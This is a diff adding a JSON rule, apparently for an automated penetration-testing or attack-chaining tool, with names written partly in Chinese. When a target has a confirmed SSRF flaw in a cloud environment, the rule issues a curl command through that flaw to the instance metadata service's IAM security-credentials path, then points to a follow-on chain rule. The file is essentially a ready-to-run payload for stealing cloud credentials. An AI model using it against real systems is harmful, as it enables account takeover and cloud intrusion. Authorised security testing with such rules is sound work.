@@ -1,0 +1,36 @@
+{
+  "id": "R-VULN-SSRF-CHAIN-001",
+  "name": "SSRF 已确认且云环境",
+  "category": "vuln",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "ssrf"
+      },
+      {
+        "fact": "cloud",
+        "op": "eq",
+        "value": true
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "SSRF 打 IMDS 元数据",
+    "actions": [
+      {
+        "tool": "curl",
+        "cmd": "curl {ssrf_url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      }
+    ],
+    "on_hit_class": "ssrf.cloud_imds",
+    "chain_hint": [
+      "R-CHAIN-SSRF-CLOUD"
+    ],
+    "priority": {
+      "impact": 0.9,
+      "cost": 0.15
+    }
+  }
+}
